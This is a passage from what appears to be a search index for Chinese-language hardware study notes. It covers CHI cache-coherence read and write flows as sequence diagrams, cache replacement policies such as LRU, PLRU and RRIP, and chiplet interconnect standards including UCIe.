Requester\n    participant Home\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: RespSepData\n    Home-&gt;&gt;Requester: DataSepResp\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b Home Node \u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u8f6c\u800c\u200b\u8be2\u95ee\u200b Subordinate\uff0cSubordinate \u200b\u628a\u200b\u7ed3\u679c\u200b\u76f4\u63a5\u200b\u53d1\u56de\u200b\u7ed9\u200b\u4e86\u200b Requester\uff08Combined response from Subordinate\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Subordinate: ReadNoSnp\n    Subordinate-&gt;&gt;Requester: CompData\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u56db\u79cd\u200b\u662f\u200b Home Node \u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u8f6c\u800c\u200b\u8be2\u95ee\u200b Subordinate\uff0c\u200b\u4f46\u200b\u8fd9\u6b21\u200b\u63d0\u524d\u200b\u544a\u8bc9\u200b Requester \u200b\u8bfb\u53d6\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u6700\u540e\u200b Subordinate \u200b\u628a\u200b\u7ed3\u679c\u200b\u53d1\u56de\u200b\u7ed9\u200b\u4e86\u200b Requester\uff08Response from Home, Data from Subordinate\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: RespSepData\n    Home-&gt;&gt;Subordinate: ReadNoSnpSep\n    Subordinate-&gt;&gt;Home: ReadReceipt\n    Subordinate-&gt;&gt;Requester: DataSepResp\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e94\u79cd\u200b\u662f\u200b\u6570\u636e\u200b\u5728\u200b\u5176\u4ed6\u200b\u7684\u200b Requester Node \u200b\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b Home \u200b\u8d1f\u8d23\u200b Snoop\uff08Forwarding snoop\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Snoopee\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Snoopee: Snp*Fwd\n    Snoopee-&gt;&gt;Requester: CompData\n    Snoopee-&gt;&gt;Home: SnpRespFwded\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u516d\u79cd\u200b\u662f\u200b MakeReadUnique\uff0c\u200b\u6b64\u65f6\u200b\u53ea\u200b\u66f4\u65b0\u200b\u6743\u9650\u200b\uff0c\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u6570\u636e\u200b\u7684\u200b\u4f20\u8f93\u200b\uff08MakeReadUnique only\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: MakeReadUnique\n    Home-&gt;&gt;Requester: Comp\n    Requester-&gt;&gt;Home: CompAck</code></pre>"},{"location":"hardware/cache_coherence_protocol.html#_8","title":"\u5199\u200b\u8bf7\u6c42","text":"<p>CHI \u200b\u6807\u51c6\u200b\u7b2c\u200b 2.3.2 \u200b\u63cf\u8ff0\u200b\u4e86\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6d41\u7a0b\u200b\u3002\u200b\u548c\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u4e00\u6837\u200b\uff0c\u200b\u5199\u200b\u8bf7\u6c42\u200b\u4e5f\u200b\u6709\u200b\u5f88\u591a\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8fdb\u884c\u200b\u4ecb\u7ecd\u200b\u3002\u200b\u4e0e\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u4e0d\u540c\u200b\u7684\u200b\u70b9\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u628a\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b\u6570\u636e\u200b\u7b49\u200b\u4e00\u6b21\u6027\u200b\u53d1\u9001\u200b\u8fc7\u53bb\u200b\uff0c\u200b\u800c\u662f\u200b\u5148\u53d1\u200b\u4e00\u4e2a\u200b\u5199\u200b\u6d88\u606f\u200b\uff0c\u200b\u5bf9\u65b9\u200b\u56de\u590d\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u6570\u636e\u200b\u4e86\u200b\uff08DBIDResp\uff09\uff0c\u200b\u518d\u200b\u628a\u200b\u5b9e\u9645\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u8fc7\u53bb\u200b\uff08NCBWrData\uff09\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e2d\u9014\u200b\u53cd\u6094\u200b\uff08WriteDataCancel\uff09\u3002</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b Direct Write-data Transfer\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u6570\u636e\u200b\u8981\u200b\u4ece\u200b Requester \u200b\u76f4\u63a5\u200b\u4f20\u5230\u200b Subordinate \u200b\u4e0a\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Subordinate: Write*\n    Subordinate-&gt;&gt;Requester: DBIDResp\n    Requester-&gt;&gt;Subordinate: NCBWrData/WriteDataCancel\n    Subordinate-&gt;&gt;Home: Comp\n    Home-&gt;&gt;Requester: Comp</code></pre> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u6bd4\u8f83\u200b\u5e38\u89c4\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u7ed9\u200b Home Node\uff0c\u200b\u5176\u4e2d\u200b Comp \u200b\u8868\u793a\u200b\u8bfb\u53d6\u200b\u7ed3\u679c\u200b\uff0cDBIDResp \u200b\u8868\u793a\u200b\u53ef\u4ee5\u200b\u53d1\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e86\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Requester: DBIDResp/DBIDRespOrd\n    Home-&gt;&gt;Requester: Comp\n    Requester-&gt;&gt;Home: NCBWrData/WriteDataCancel</code></pre> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b\u628a\u200b\u7b2c\u4e8c\u79cd\u200b\u7684\u200b DBIDResp \u200b\u548c\u200b Comp \u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u200b\u54cd\u5e94\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Requester: CompDBIDResp\n    Requester-&gt;&gt;Home: NCBWrData/WriteDataCancel</code></pre>"},{"location":"hardware/cache_coherence_protocol.html#_9","title":"\u53c2\u8003\u200b\u6587\u6863","text":"<ul> <li>Cache coherence</li> <li>MSI protocol</li> <li>Write-once (cache coherence)</li> <li>MESI protocol</li> <li>MOESI protocol</li> <li>Dragon protocol</li> <li>A Strategy to Verify an AXI/ACE Compliant Interconnect (2 of 4)</li> <li>Directory-based cache coherence</li> <li>TileLink spec</li> <li>rocket-chip</li> <li>IHI0022E-AMBA AXI and ACE</li> </ul>"},{"location":"hardware/cache_replacement_policy.html","title":"\u7f13\u5b58\u200b\u66ff\u6362\u200b\u7b56\u7565","text":""},{"location":"hardware/cache_replacement_policy.html#lruleast-recently-used","title":"LRU(Least Recently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u66f4\u65b0\u200b\u5b83\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u6700\u65e9\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u89c6\u4e3a\u200b\u6bd4\u200b\u5408\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u90fd\u200b\u66f4\u200b\u65e9\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#plrupseudo-least-recently-used","title":"PLRU(Pseudo Least Recently Used)","text":"<p>\u200b\u7528\u200b\u4e8c\u53c9\u6811\u200b\u6765\u200b\u7ef4\u62a4\u200b\u72b6\u6001\u200b\uff0c\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u5bf9\u5e94\u200b\u5404\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u8bb0\u5f55\u200b\u96f6\u200b\u6216\u200b\u4e00\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u5de6\u5b50\u6570\u200b\u6216\u200b\u53f3\u5b50\u200b\u6811\u200b\uff0c\u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u66f4\u200b\u65e9\u200b\u7684\u200b\u5b50\u6811\u200b\u3002\u200b\u5f53\u200b\u8bbf\u95ee\u200b\u5143\u7d20\u200b\u65f6\u200b\uff0c\u200b\u628a\u200b\u4ece\u200b\u6839\u200b\u7ed3\u70b9\u200b\u5230\u200b\u5143\u7d20\u200b\u5bf9\u5e94\u200b\u7684\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u6307\u5411\u200b\u4e0d\u200b\u5728\u200b\u8def\u5f84\u200b\u7684\u200b\u4e00\u4fa7\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6cbf\u7740\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u4e0a\u200b\u8bb0\u5f55\u200b\u7684\u200b\u65b9\u5411\u200b\uff0c\u200b\u4e00\u8def\u200b\u8d70\u5230\u200b\u7684\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u5bf9\u5e94\u200b\u8981\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#mrumost-recently-used","title":"MRU(Most Recently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u66f4\u65b0\u200b\u5b83\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u6700\u665a\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#lfuleast-frequently-used","title":"LFU(Least Frequently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u589e\u52a0\u200b\u4e00\u6b21\u200b\u5b83\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u6700\u5c0f\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u89c6\u4e3a\u200b\u96f6\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#random","title":"Random","text":"<p>\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u968f\u673a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#rripre-reference-interval-prediction","title":"RRIP(Re-Reference Interval Prediction)","text":"<p>\u200b\u8bba\u6587\u200b\uff1aHigh Performance Cache Replacement Using Re-Reference Interval Prediction (RRIP)</p> <p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b RRPV\uff08Re-Reference Prediction Value\uff09\u200b\u503c\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\uff08Hit Priority \u200b\u65b9\u5f0f\u200b\uff09\u200b\u6216\u8005\u200b\u51cf\u53bb\u200b\u4e00\u200b\uff08Frequency Priority \u200b\u65b9\u5f0f\u200b\uff09\u3002</p> <p>\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u200b\u6240\u6709\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u4e0d\u65ad\u200b\u540c\u65f6\u200b\u52a0\u4e00\u200b\uff0c\u200b\u76f4\u5230\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u7b49\u4e8e\u200b maxRRPV\uff08RRPV \u200b\u53ef\u80fd\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u6700\u5927\u503c\u200b\uff09\uff0c\u200b\u6b64\u65f6\u200b\u5b83\u200b\u5c31\u662f\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u3002\u200b\u7b49\u4ef7\u200b\u5730\u8bf4\u200b\uff0cRRPV \u200b\u6700\u5927\u200b\u7684\u200b\u5143\u7d20\u200b\u5c31\u662f\u200b\u8981\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\uff0c\u200b\u540c\u65f6\u200b\u589e\u52a0\u200b\u5176\u4f59\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\uff0c\u200b\u589e\u52a0\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u7b49\u4e8e\u200b maxRRPV\uff0c\u200b\u51cf\u53bb\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#srripstatic-rrip","title":"SRRIP(Static RRIP)","text":"<p>RRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b maxRRPV-1\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#brripbimodel-rrip","title":"BRRIP(Bimodel RRIP)","text":"<p>RRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u6309\u7167\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6982\u7387\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b maxRRPV \u200b\u6216\u200b maxRRPV-1\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#nrunot-recently-used","title":"NRU(Not Recently Used)","text":"<p>SRRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1aRRPV \u200b\u53ea\u80fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u6216\u8005\u200b\u4e00\u200b\uff1b\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002</p> <p>\u200b\u7b49\u4ef7\u200b\u5730\u8bf4\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002\u200b\u5728\u200b\u66ff\u6362\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b RRPV \u200b\u7b49\u4e8e\u200b\u4e00\u200b\u7684\u200b\u5143\u7d20\u200b\uff0c\u200b\u5219\u200b\u66ff\u6362\u200b\u5b83\u200b\uff1b\u200b\u5982\u679c\u200b\u6240\u6709\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u90fd\u200b\u7b49\u4e8e\u96f6\u200b\uff0c\u200b\u5219\u200b\u66ff\u6362\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5e76\u200b\u628a\u200b\u5269\u4e0b\u200b\u7684\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u90fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u200b\u3002</p>"},{"location":"hardware/chiplet.html","title":"Chiplet Interface","text":""},{"location":"hardware/chiplet.html#acc-rv-road-vehicles-advanced-cost-driven-chiplet-interface","title":"ACC RV (Road vehicles - Advanced Cost-driven Chiplet Interface) \u200b\u8f66\u89c4\u7ea7\u200b\u82af\u7c92\u200b\u4e92\u8054\u200b\u63a5\u53e3\u6807\u51c6","text":"<p>\u200b\u8f66\u89c4\u7ea7\u200b\u82af\u7c92\u200b\u4e92\u8054\u200b\u63a5\u53e3\u6807\u51c6\u200b \u2013 \u200b\u8349\u6848\u200b</p> <p>Road vehicles - Advanced Cost-driven Chiplet Interface (ACC_RV 1.0)</p> <p>\u200b\u6807\u51c6\u200b\u94fe\u63a5\u200b\uff1ahttp://www.iiisct.com/smart/upload/CMS1/202303/ACC_RV%201.0.pdf</p> <p>ACC RV 1.0 \u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u5c42\u6b21\u200b\uff1a</p> <ol> <li>\u200b\u534f\u8bae\u200b\u5c42\u200b Protocol Layer\uff1a\u200b\u652f\u6301\u200b CXL 3.0\uff08Standard 256B Flit\uff09\uff0cAXI 4.0 \u200b\u6216\u8005\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b Stream \u200b\u534f\u8bae\u200b</li> <li>\u200b\u94fe\u8def\u5c42\u200b Link Layer\uff1a\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\uff0c\u200b\u94fe\u8def\u200b\u9002\u914d\u200b</li> <li>\u200b\u6570\u5b57\u200b\u7269\u7406\u5c42\u200b Digital Physical Layer</li> <li>\u200b\u7535\u6c14\u200b\u7269\u7406\u5c42\u200b Electrical Physical Layer</li> </ol>"},{"location":"hardware/chiplet.html#bow-bunch-of-wires","title":"BoW (Bunch of Wires)","text":"<p>Specification: https://opencomputeproject.github.io/ODSA-BoW/bow_specification.html https://www.opencompute.org/documents/bow-specification-v2-0d-1-pdf https://www.opencompute.org/documents/bunch-of-wires-phy-specification-pdf</p>"},{"location":"hardware/chiplet.html#ucie-universal-chiplet-interconnect-express","title":"UCIe (Universal Chiplet Interconnect Express)","text":"<p>UCIe \u200b\u7684\u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5b98\u200b\u7f51\u4e0a\u200b\u7533\u8bf7\u200b\uff0c\u200b\u7533\u8bf7\u200b\u540e\u8fc7\u200b\u51e0\u5929\u200b\u4f1a\u200b\u5728\u200b\u90ae\u7bb1\u200b\u91cc\u200b\u6536\u5230\u200b UCIe \u200b\u7684\u200b\u6807\u51c6\u200b PDF\u3002\u200b\u4e0b\u6587\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b UCIe 1.1\uff082023 \u200b\u5e74\u200b 7 \u200b\u6708\u200b 10 \u200b\u65e5\u200b \u200b\u7248\u672c\u200b\uff09\u3002\u200b\u6309\u7167\u200b UCIe \u200b\u6807\u51c6\u200b\u8981\u6c42\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5217\u51fa\u200b UCIe \u200b\u6807\u51c6\u200b\u7684\u200b\u7248\u6743\u200b\u4fe1\u606f\u200b\uff1a <code>\u00a9 2022\u20132023 UNIVERSAL CHIPLET INTERCONNECT EXPRESS, INC. ALL RIGHTS RESERVED</code>\u3002</p>"},{"location":"hardware/chiplet.html#_1","title":"\u4ecb\u7ecd","text":"<p>UCIe \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b Chiplet \u200b\u7684\u200b\u4e92\u8054\u200b\u534f\u8bae\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e2a\u200b package \u200b\u4e0a\u200b\u7684\u200b\u591a\u4e2a\u200b die \u200b\u8fde\u63a5\u8d77\u6765\u200b\u3002\u200b\u5b83\u200b\u652f\u6301\u200b\u4e0d\u540c\u200b\u7684\u200b\u534f\u8bae\u200b\uff1a\u200b\u6807\u51c6\u200b\u7684\u200b PCIe \u200b\u548c\u200b CXL\uff0c\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b\uff0c\u200b\u6216\u8005\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b\u534f\u8bae\u200b\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u4e3b\u8981\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u91c7\u7528\u200b\u4e00\u4e2a\u200b\u6807\u51c6\u200b\u7684\u200b\u7269\u7406\u5c42\u200b\u548c\u200b\u94fe\u8def\u5c42\u200b\uff0c\u200b\u628a\u200b die \u200b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u534f\u8bae\u200b\u201c\u200b\u6807\u51c6\u5316\u200b\u201d\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b UCIe \u200b\u4e0a\u5c42\u200b\uff0c\u200b\u5177\u4f53\u200b\u7528\u200b\u4ec0\u4e48\u200b\u534f\u8bae\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u90a3\u4e48\u200b\u6807\u51c6\u200b\u4e86\u200b\u3002</p> <p>UCIe \u200b\u4ece\u200b\u9ad8\u5230\u200b\u4f4e\u200b\u5206\u4e3a\u200b\u4e09\u5c42\u200b\uff1a</p> <ol> <li>\u200b\u4e0a\u5c42\u200b\u7684\u200b Protocol Layer\uff1a\u200b\u652f\u6301\u200b PCIe\uff0cCXL\uff0c\u200b\u6216\u8005\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b</li> <li>\u200b\u4e2d\u95f4\u200b\u7684\u200b Die-to-Die Adapter</li> <li>\u200b\u5e95\u5c42\u200b\u7684\u200b Physical Layer</li> </ol>"},{"location":"hardware/chiplet.html#protocol-layer-die-to-die-adapter","title":"Protocol Layer &amp; Die-to-Die Adapter","text":"<p>Protocol Layer \u200b\u652f\u6301\u200b PCIe\u3001CXL \u200b\u6216\u8005\u200b\u901a\u7528\u200b\u7684\u200b Streaming \u200b\u534f\u8bae\u200b\u3002</p> <p>PCIe \u200b\u4ece\u200b 6.0 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b 256B \u200b\u7684\u200b FLIT\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u8981\u200b\u5728\u200b UCIe \u200b\u4e0a\u200b\u8dd1\u200b PCIe 6.0\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b PCIe 6.0 \u200b\u7684\u200b FLIT \u200b\u4f5c\u4e3a\u200b UCIe \u200b\u7684\u200b Protocol Layer\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cCXL \u200b\u652f\u6301\u200b 68B \u200b\u548c\u200b 256B \u200b\u4e24\u79cd\u200b\u5927\u5c0f\u200b\u7684\u200b FLIT\uff0cUCIe \u200b\u4e5f\u200b\u628a\u200b CXL \u200b\u7684\u200b\u4e24\u79cd\u200b FLIT \u200b\u5927\u5c0f\u200b\u5f15\u5165\u200b\u4e86\u200b\u8fdb\u6765\u200b\uff0c\u200b\u4f5c\u4e3a\u200b Protocol Layer\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Streaming \u200b\u534f\u8bae\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u501f\u7528\u200b PCIe \u200b\u6216\u8005\u200b CXL \u200b\u7684\u200b FLIT \u200b\u683c\u5f0f\u200b\u6765\u200b\u4f20\u8f93\u200b\u3002</p> 